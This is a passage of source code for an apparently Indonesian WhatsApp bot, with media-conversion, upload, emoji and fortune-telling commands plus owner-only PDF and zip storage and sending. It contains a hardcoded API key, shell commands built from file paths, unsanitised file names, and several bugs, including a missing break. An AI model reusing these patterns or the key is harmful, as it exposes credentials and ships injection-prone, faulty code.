kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
hupao.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break
//=================================================
case 'toimage': case 'toimg': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await hupao.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
hupao.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp3':
    case 'toaudio': {
         if (groupMute) return 'error'
    if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
    await loading()
    let media = await hupao.downloadMediaMessage(quoted)
    let { toAudio } = require('./lib/converter.js')
    let audio = await toAudio(media, 'mp4')
    hupao.sendMessage(m.chat, {
        document: audio,
        mimetype: 'audio/mp3',
        fileName: `${hupao.user.name}.mp3`
    }, {
        quoted: m
    })

}
//=================================================//
case 'toaudio': case 'audio': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await hupao.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter.js')
let audio = await toAudio(media, 'mp4')
hupao.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
//=================================================//
case 'tovn': case 'voice': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
m.reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./lib/converter.js')
let audio = await toPTT(media, 'mp4')
hupao.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6283129109022',
title: `Boedzhanks`,
sourceUrl: `https://wa.me/6283129109022`, 
thumbnail: thumb
}
}})
}
break
//=================================================//
case 'tomp4':
            case 'tovideo': {
                 if (groupMute) return 'error'
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await loading()
                let media = await hupao.downloadAndSaveMediaMessage(quoted, new Date *1)
                await exec(`convert ${media} './temp/frames.png'`, (error, stdout, stderr) => {
                    if (error) {
                      console.error(`exec error: ${error}`);
                      return;
                    }
                    console.log(`stdout: ${stdout}`);
                    console.error(`stderr: ${stderr}`);
                        exec(`ffmpeg -i './temp/frames-%0d.png' -c:v libx264 -pix_fmt yuvj420p -vf "fps=30" "out.mp4"`)
                  });
                  setTimeout(() => {
                  outputFile = fs.readFileSync('./out.mp4')
                  hupao.sendMessage(from, {video: outputFile, caption: 'Convert Webp To Video' }, {quoted: fkontak})
                  fs.unlinkSync(media)
                  fs.unlinkSync('./out.mp4')
                  const frameFiles = fs.readdirSync('./temp').filter(file => file.startsWith('frames-') && file.endsWith('.png'));
                        for (const file of frameFiles) {
                        fs.unlinkSync(path.join('./temp', file));
                     }
                    }, 5000)
            }
            break
                case 'togif': {
                     if (groupMute) return 'error'
                    if (!quoted) throw 'Reply Image'
                    if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                    await loading()
                    let media = await hupao.downloadAndSaveMediaMessage(quoted, new Date *1)
                    await exec(`convert ${media} './temp/frames.png'`, (error, stdout, stderr) => {
                        if (error) {
                          console.error(`exec error: ${error}`);
                          return;
                        }
                        console.log(`stdout: ${stdout}`);
                        console.error(`stderr: ${stderr}`);
                            exec(`ffmpeg -i './temp/frames-%0d.png' -c:v libx264 -pix_fmt yuvj420p -vf "fps=30" "out.mp4"`)
                      });
                      setTimeout(() => {
                      outputFile = fs.readFileSync('./out.mp4')
                      hupao.sendMessage(from, {video: outputFile, caption: 'Convert Webp To Gif', gifPlayback: true }, {quoted: fkontak})
                      fs.unlinkSync(media)
                      fs.unlinkSync('./out.mp4')
                      const frameFiles = fs.readdirSync('./temp').filter(file => file.startsWith('frames-') && file.endsWith('.png'));
                            for (const file of frameFiles) {
                            fs.unlinkSync(path.join('./temp', file));
                         }
                        }, 5000)
                }
                    break
//=================================================//
case 'tourl': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader.js')
let media = await hupao.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//=================================================//
case "quotes":
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 var resi = await Quotes()
teks = `\nAuthor: ${resi.author}\n`
teks = `\nQuotes:\n`
teks = `${resi.quotes}\n`
reply(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
     if (groupMute) return 'error'
await loading()
 var ress = await Darkjokes()
teks = "*Darkjokes*"
hupao.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:m })
break
//=================================================//
case 'emojimix': { 
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await hupao.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await hupao.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏*Mimpi :* ${anu.message.mimpi}\n❏ *Arti :* ${anu.message.arti}\n❏ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} Boedzhanks, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Nama Anda :* ${anu.message.nama_anda.nama}\n❏ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❏ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❏ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} Boedzhanks`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Nama :* ${anu.message.nama}\n❏ *Arti :* ${anu.message.arti}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} Boedzhanks, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Life Path :* ${anu.message.life_path}\n❏ *Destiny :* ${anu.message.destiny}\n❏ *Destiny Desire :* ${anu.message.destiny_desire}\n❏ *Personality :* ${anu.message.personality}\n❏ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} Boedzhanks|Putri`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendImage(from,  anu.message.gambar, `❏ *Nama Anda :* ${anu.message.nama_anda}\n❏ *Nama Pasangan :* ${anu.message.nama_pasangan}\n❏ *Sisi Positif :* ${anu.message.sisi_positif}\n❏ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Tanggal Pernikahan :* ${anu.message.tanggal}\n❏ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Lahir :* ${anu.message.hari_lahir}\n❏ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Lahir :* ${anu.message.hari_lahir}\n❏ *Rezeki :* ${anu.message.rejeki}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Lahir :* ${anu.message.hari_lahir}\n❏ *Pekerjaan :* ${anu.message.pekerjaan}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Analisa :* ${anu.message.analisa}\n❏ *Angka Akar :* ${anu.message.angka_akar}\n❏ *Sifat :* ${anu.message.sifat}\n❏ *Elemen :* ${anu.message.elemen}\n❏ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Analisa :* ${anu.message.analisa}\n❏ *Sektor :* ${anu.message.sektor}\n❏ *Elemen :* ${anu.message.elemen}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendImage(from, anu.message.image, `❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Simbol Tarot :* ${anu.message.simbol_tarot}\n❏ *Arti :* ${anu.message.arti}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} Boedzhanks, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tahun_lahir}\n❏ *Gender :* ${anu.message.jenis_kelamin}\n❏ *Angka Kua :* ${anu.message.angka_kua}\n❏ *Kelompok :* ${anu.message.kelompok}\n❏ *Karakter :* ${anu.message.karakter}\n❏ *Sektor Baik :* ${anu.message.sektor_baik}\n❏ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Kala Tinantang :* ${anu.message.kala_tinantang}\n❏ *Info :* ${anu.message.info}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Hasil :* ${anu.message.result}\n❏ *Info :* ${anu.message.info}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Hari Lahir :* ${anu.message.hari_lahir}\n❏ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n❏ *Hari Naas :* ${anu.message.hari_naas}\n❏ *Info :* ${anu.message.catatan}\n❏ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Hari Lahir :* ${anu.message.hari_lahir}\n❏ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n❏ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Hari Lahir :* ${anu.message.hari_lahir}\n❏ *tanggal Lahir :* ${anu.message.tgl_lahir}\n❏ *Arah Rezeki :* ${anu.message.arah_rejeki}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} Boedzhanks, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Tanggal :* ${anu.message.tanggal}\n❏ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n❏ *Watak Hari :* ${anu.message.watak_hari}\n❏ *Naga Hari :* ${anu.message.naga_hari}\n❏ *Jam Baik :* ${anu.message.jam_baik}\n❏ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} Boedzhanks, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} Boedzhanks, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Nama :* ${anu.message.nama}\n❏ *Lahir :* ${anu.message.tgl_lahir}\n❏ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Tanggal :* ${anu.message.tgl_memancing}\n❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Hasil :* ${anu.message.result}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Zodiak :* ${anu.message.zodiak}\n❏ *Nomor :* ${anu.message.nomor_keberuntungan}\n❏ *Aroma :* ${anu.message.aroma_keberuntungan}\n❏ *Planet :* ${anu.message.planet_yang_mengitari}\n❏ *Bunga :* ${anu.message.bunga_keberuntungan}\n❏ *Warna :* ${anu.message.warna_keberuntungan}\n❏ *Batu :* ${anu.message.batu_keberuntungan}\n❏ *Elemen :* ${anu.message.elemen_keberuntungan}\n❏ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n❏ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return m.reply(anu.message)
 hupao.sendText(from, `❏ *Hasil :* ${anu.message}`, m)
}
break
//=================================================//
case 'setcmd': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
     if (groupMute) return 'error'
if (isBan) return m.reply('*Kamu masuk dalam daftar ban*')
await loading()
let teks = `list cmd`
hupao.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'addpdf':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await hupao.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break
//=================================================//
case 'delpdf':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
//=================================================//
case 'listpdf': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│❏ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf Boedzhanks + sambil reply pesan target* \n\n Contoh 2 : yopdf Boedzhanks`
m.reply(teksoooo)
}
break
//=================================================//
case 'yopdf':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
let teks = `${text}`
{
hupao.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendpdf': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
hupao.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addzip':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await hupao.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
//=================================================//
case 'delzip':{
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
//=================================================//
case 'listzip': {
     if (groupMute) return 'error'
if (!isOwner) return m.reply('*Khusus Owner*')
await loading()
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
